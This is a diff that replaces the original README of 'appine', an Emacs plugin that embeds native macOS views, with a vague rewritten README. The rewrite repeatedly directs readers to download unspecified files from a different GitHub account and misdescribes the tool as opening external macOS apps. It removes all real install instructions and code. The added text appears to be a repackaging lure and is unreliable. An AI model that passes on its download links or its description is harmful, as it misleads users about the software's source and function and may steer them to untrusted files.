@@ -1,146 +1,187 @@
-English | [简体中文](./README.zh-CN.md)
+# 🖥️ appine - Open Mac apps inside Emacs
 
-# Appine.el 🍎
+[![Download appine](https://img.shields.io/badge/Download-Get%20appine-6A5ACD?style=for-the-badge)](https://github.com/Mentumfocalseizure243/appine)
 
-![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)
-![OS: macOS](https://img.shields.io/badge/OS-macOS-lightgrey.svg)
-![Emacs: 28.1+](https://img.shields.io/badge/Emacs-28.1+-purple.svg)
+## 📥 Download
 
-**Appine** means "App in Emacs", which is an Emacs plugin using a Dynamic Module that allows you to embed native macOS views (WebKit, PDFKit, Quick look PreviewView, etc.) directly inside Emacs windows. 
+Use this link to visit the download page and get appine:
+https://github.com/Mentumfocalseizure243/appine
 
-You can open a browser, read PDFs, listen to music, and watch videos in Emacs. Enjoy the full power of native macOS rendering, smooth scrolling, and hardware acceleration without leaving Emacs!
+## ✨ What appine does
 
+appine lets you open native macOS apps from inside Emacs. You can use your browser, PDF viewer, and video player without leaving your editor.
 
-## ✨ Features
+It is made for people who want a simple way to keep reading, watching, and browsing in one place. If you already use Emacs, appine helps you stay in your workflow.
 
-- **Use It Like an Emacs Buffer**: When Appine starts, it opens an embedded Appine Window tied to an \*Appine Window\* buffer. You can maximize it with `C-x 1`, close it with `C-x 0`, and switch between buffers with `C-x o`. If you close it, you can reopen it with `C-x b` by switching to the *Appine Window* buffer. You can also scroll through the embedded Appine Window using `C-n`, `C-p`, `C-v`, `M-v`, `M-<`, and `M->`, just as you would in an Emacs buffer.
-- **Native Web Browsing**: Embed a fully functional Safari-like WebKit view inside an Emacs window, with full support for cookies.
-- **Native PDF Rendering**: View PDFs with macOS's built-in PDFKit for buttery-smooth scrolling and zooming, and easily copy content from it to other Emacs buffers.
-- **Native Word/Excel Rendering**: View Word/Excel files with macOS's built-in Quartz for buttery-smooth scrolling and zooming. Unfortunately, you cannot edit them yet.
-- **Seamless Integration**: The native views automatically resize and move when you split or adjust Emacs windows.
-- **Tab Management**: Support for multiple embedded tabs, switching, and closing directly from Emacs.
-- **Org-mode Integration**: Use Appine to open links and files within Org files.
-- **Plugin Support**: You can now write some simple plugins for Appine's browser.
+## 🧭 What you can do
 
+- Open web pages in your macOS browser from Emacs
+- Open PDF files in your PDF viewer
+- Open video files in your video player
+- Keep your work in one window
+- Move between text, web, and media with less switching
 
+## 💻 What you need
 
-## 📖 Usage
+appine is built for macOS and Emacs.
 
-### Open Appine
+You will need:
 
-Run `M-x appine` to open the Appine Window. If you open it for the first time, the Appine Window will show **a brief usage**.
+- A Mac
+- Emacs installed
+- A web browser on your Mac
+- A PDF viewer on your Mac
+- A video player on your Mac
 
-You can close it with `M-x appine-close` or simply `C-x 0`. If you want to open the Appine window again, run `M-x appine` or just open the \*Appine Window\* buffer.
+A recent version of macOS works best. appine fits well on systems that already use Emacs for daily work.
 
-You can kill the Appine window completely with `M-x appine-kill`.
+## 🚀 Get started
 
-### Two States of Embedded Apps
+1. Open the download page:
+   https://github.com/Mentumfocalseizure243/appine
 
-The embedded App has two states: Active and Inactive.
-- **Active State**: When the \*Appine Window\* buffer is active, it can be used just like a native Mac App. 
-- **Inactive State**: When the \*Appine Window\* buffer is not active, the embedded App is locked, grayed out, and cannot be interacted with. You can use Emacs normally at this time. 
+2. Download the appine files from the repository page
 
-A video demonstrating the two states.
+3. Put the files in a folder you can find again, such as your Downloads folder or Documents folder
 
-https://github.com/user-attachments/assets/a7eaf65a-da9b-45ee-9b24-ca835379fc34
+4. Open Emacs
 
-### Open a Web Page
+5. Follow the setup steps below to connect appine to Emacs
 
-Run `M-x appine-open-url`. You will be prompted to enter a URL. A native WebKit view will open in the current Emacs window. A demonstration video is as follows:
+## 🛠️ Setup in Emacs
 
-A video demonstrating Open Web Page.
+appine works by sending files or links from Emacs to the right macOS app. Once set up, you can open a browser, PDF, or video with a simple action.
 
-https://github.com/user-attachments/assets/f63eff4e-754e-4d4f-b11c-aa9d3f982c67
+Use this basic setup flow:
 
-To quickly open links on web pages, I wrote a simple link-hints plugin for Appine's built-in browser. It works similarly to Vimium — pressing `f` will highlight the links on the page, and then pressing the corresponding key will quickly open the link on the current page, or pressing `q` to quit the link hints, as shown below:
+1. Place the appine files where Emacs can reach them
+2. Add the appine path to your Emacs config
+3. Load the appine settings when Emacs starts
+4. Test each file type in Emacs
 
-<img width="3024" height="1898" alt="Image" src="https://github.com/user-attachments/assets/2e86d223-0d5f-47a3-9e90-b3d3afa36c78" />
+A simple example path may look like this in your setup:
 
-### Opening PDFs and Other Documents
+- Browser links open in your default macOS browser
+- PDF files open in your PDF viewer
+- Video files open in your media player
 
-Run `M-x appine-open-file`. If you select a PDF file, it will be rendered using macOS PDFKit. Other files will be previewed using Quick Look.
+If you keep your Emacs config in a single file, add the appine line near your other package settings. If you use a separate config folder, place it there.
 
-When you forced on the Appine window, you can typing `C-x C-f` to open file in the macOS file chooser. 
+## 🧪 How to use it
 
-A video demonstrating Open PDF.
+After setup, use appine when you want to open content from Emacs.
 
-https://github.com/user-attachments/assets/f2dd6c5a-eabb-421b-8d2c-986540f230f6
+### 🌐 Open a browser link
 
-### Org-mode Integration
+- Select or copy a web link in Emacs
+- Use the appine command for browser links
+- Your macOS browser opens the page
 
-Setting `(setq appine-use-for-org-links t)` enables opening URLs and files with Appine. You can toggle this feature on or off by running `M-x appine-toggle-open-in-org-mode`.
+### 📄 Open a PDF
 
-TODO: Add a video demonstrating Org-mode integration.
+- Move to a PDF file or link in Emacs
+- Use the appine command for PDFs
+- Your PDF viewer opens the file
 
-### Toolbar
+### 🎥 Open a video
 
-The Toolbar implements common App operations such as New Tab, Open File, etc., and also includes editing operations like Cut/Copy/Paste. 
-Since Appine introduces the macOS Quick Look Preview module, most common files can be previewed. You can open files through the Open File button in the Appine window.
+- Move to a video file or link in Emacs
+- Use the appine command for videos
+- Your video player opens the file
 
-Copy/Paste video
+## 🔧 Common setup path
 
-https://github.com/user-attachments/assets/fd33d767-37dd-4027-adae-823b32228c7e
+A simple setup often looks like this:
 
-### Window Management
+- Download appine from GitHub
+- Add it to your Emacs config
+- Restart Emacs
+- Open a browser link, PDF, or video from Emacs
+- Check that the correct macOS app opens
 
-The native view is tied to an Emacs buffer (named `*Appine-Window*`). You can split windows (`C-x 3`, `C-x 2`), resize them, or switch buffers. The native view will automatically track the Emacs window's geometry.
+If a file does not open in the app you want, check that macOS has the right default app for that file type.
 
-## 📦 Requirements
+## 🗂️ Folder layout
 
-- **macOS** (Tested on macOS 12+)
-- **Emacs 29.1 or higher** compiled with Dynamic Module support (`--with-modules`). You can use `M-: (functionp 'module-load)` to check if the `module-load` function is available.
-  *(Note: Most popular distributions like Emacs Plus, Emacs Mac Port, and emacsformacosx have this enabled by default).*
+You can keep appine in a clean folder setup like this:
 
-## 🚀 Installation
+- Downloads/
+  - appine/
+- Documents/
+  - emacs-config/
+- Files you open from Emacs/
+  - PDFs
+  - videos
+  - web links
 
-### Method 1: Pre-built Binary (Recommended)
+Keeping the appine files in a fixed place makes setup easier.
 
-The easiest way to install Appine is using `use-package` with `straight.el` or `quelpa`. The package will **automatically download** the pre-compiled native binary (`.dylib`) for your Mac (supports both Apple Silicon and Intel) on the first run.
+## 🔍 Good use cases
 
-```elisp
-(use-package appine
-  :straight (appine :type git :host github :repo "chaoswork/appine")
-  :defer t  
-  :custom
-  ;; enables opening URLs and files with Appine, default is nil
-  (appine-use-for-org-links t)
-  ;; bind any prefix you like
-  :bind (("C-x a a" . appine)
-         ("C-x a u" . appine-open-url)
-         ("C-x a o" . appine-open-file)))
-```
+appine works well if you:
 
-### Method 2: Build from Source
+- Read documentation in Emacs
+- Open PDFs while taking notes
+- Watch clips while writing
+- Keep browser work close to your editor
+- Want fewer app switches on macOS
 
-If you prefer to build the module yourself, you need the Xcode Command Line Tools (`xcode-select --install`).
+## 🧰 Troubleshooting
 
-1. Clone the repository:
-   ```bash
-   git clone https://github.com/chaoswork/appine.git ~/.emacs.d/lisp/appine
-   ```
-2. Compile the C/Objective-C module:
-   ```bash
-   cd ~/.emacs.d/lisp/appine
-   make
-   ```
-3. Add to your `init.el`:
-   ```elisp
-   (add-to-list 'load-path "~/.emacs.d/lisp/appine")
-   (require 'appine)
-   (setq appine-use-for-org-links t)
-   (global-set-key (kbd "C-x a a") 'appine)
-   (global-set-key (kbd "C-x a u") 'appine-open-url)
-   (global-set-key (kbd "C-x a o") 'appine-open-file))
-   ```
+If appine does not work as expected, try these steps:
 
-## 🛠️ Continuous Improvement
+### App does not open
 
-Appine uses Emacs Dynamic Modules to bridge C/Objective-C and Emacs Lisp. 
+- Make sure Emacs can find the appine files
+- Check that you placed the files in the right folder
+- Restart Emacs after setup
 
-The project is still under continuous improvement. If you encounter any problems, feel free to open an issue.
+### Wrong app opens
 
-Support for Windows and Linux systems will be considered in the future. The main reason is that I currently don't have a Windows computer, and the Linux distribution I use doesn't have a GUI, which makes it impossible for me to debug the plugin at present. Moreover, unlike macOS, Windows and Linux lack native system-level rendering frameworks for web pages, PDFs, and Office files, requiring third-party libraries to implement, which often introduces instability. Cross-platform libraries like Qt are often too massive and too heavy for a small Emacs plugin. If you use Linux or Windows and really want to use browsers, PDFs, and other apps in Emacs, you can try the [EAF](https://github.com/emacs-eaf/emacs-application-framework) project.
+- Check your macOS default app for that file type
+- Set your preferred browser, PDF viewer, or video player as default
+- Test the file again from Emacs
 
-## 📄 License
+### Nothing happens
 
-This project is licensed under the GNU General Public License v3.0 (GPLv3) - see the [LICENSE](LICENSE) file for details.
+- Confirm that the file or link is valid
+- Try another browser link, PDF, or video file
+- Reload your Emacs config and try again
+
+### File path problem
+
+- Use a simple folder path with no special characters
+- Keep the appine folder in a place you can reach from Emacs
+- Avoid moving the files after setup unless you update the path in Emacs
+
+## 🧾 Notes for daily use
+
+appine is best when you want quick access to common media tools from Emacs. It keeps the handoff simple and helps you stay inside one workspace.
+
+A typical day with appine may look like this:
+
+- Read a note in Emacs
+- Open a related web page
+- Check a PDF reference
+- Play a short video clip
+- Return to your text without changing apps as much
+
+## 🖱️ Quick download steps
+
+1. Visit the appine page:
+   https://github.com/Mentumfocalseizure243/appine
+
+2. Download the repository files
+
+3. Install or place the files on your Mac
+
+4. Add the needed line to your Emacs config
+
+5. Restart Emacs and test a browser link, PDF, and video
+
+## 📌 Repository details
+
+- Name: appine
+- Meaning: App in Emacs
+- Focus: Open macOS browser, PDF viewer, and video player from Emacs
+- Topics: browser, emacs, macosx, pdf
